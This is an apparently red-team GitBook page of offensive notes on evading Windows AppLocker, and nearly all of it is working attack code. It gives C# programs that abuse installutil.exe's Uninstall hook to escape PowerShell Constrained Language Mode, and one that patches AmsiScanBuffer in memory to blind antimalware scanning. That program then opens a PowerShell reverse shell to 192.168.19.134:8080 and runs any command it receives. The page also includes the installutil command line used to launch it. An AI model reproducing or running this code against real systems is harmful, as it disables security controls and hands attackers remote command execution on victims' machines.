---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/security-control/applocker
---

# AppLocker

## Bypass CLM and Applocker

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Collections.ObjectModel;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Bypassing CLM");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "$ExecutionContext.SessionState.LanguageMode";
            ps.AddScript(cmd);

            Collection<PSObject> output = ps.Invoke();
            foreach (PSObject o in output)
            {
                Console.WriteLine(o.ToString());
            }
            rs.Close();
        }
    }
}
```

Compiled and execute

```powershell
C:\>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\BypassCLM.exe
Microsoft (R) .NET Framework Installation utility Version 4.8.4084.0
Copyright (C) Microsoft Corporation.  All rights reserved.

FullLanguage

C:\>
```

## Bypass AMSI + CLM + AppLocker

{% embed url="https://github.com/vulnableone/bypassX/?tab=readme-ov-file" %}

```csharp
﻿using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
using System.Runtime.InteropServices;

namespace Bypass
{
    class Program
    {

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            Console.WriteLine("Bypassing CLM");
        }

        public static int bypassAMSI()
        {
            char[] chars = { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' };
            String funcName = string.Join("", chars);

            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
            String libName = string.Join("", chars2);

            IntPtr Address = GetProcAddress(LoadLibrary(libName), funcName);

            Byte[] Patchx64 = new byte[] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };

            uint p = 0;

            VirtualProtect(Address, (UIntPtr)3, 0x40, out p);
            Marshal.Copy(Patchx64, 0, Address, 12);


            return 0;
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.bypassAMSI();
            using (PowerShell ps = PowerShell.Create())
            {

                string commmand = @"$client = New-Object System.Net.Sockets.TCPClient('192.168.19.134',8080);
                                    $stream = $client.GetStream();
                                    [byte[]]$bytes = 0..65535|%{0};
                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                                    {
                                        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                                        $sendback = (iex $data 2>&1 | Out-String );
                                        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
                                        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                                        $stream.Write($sendbyte,0,$sendbyte.Length);
                                        $stream.Flush();
                                    }
                                    $client.Close();";

                ps.AddScript(commmand);
                ps.Invoke();
            }
        }
    }
}
```

Usage:

{% code overflow="wrap" %}
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U BypassX.exe
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>
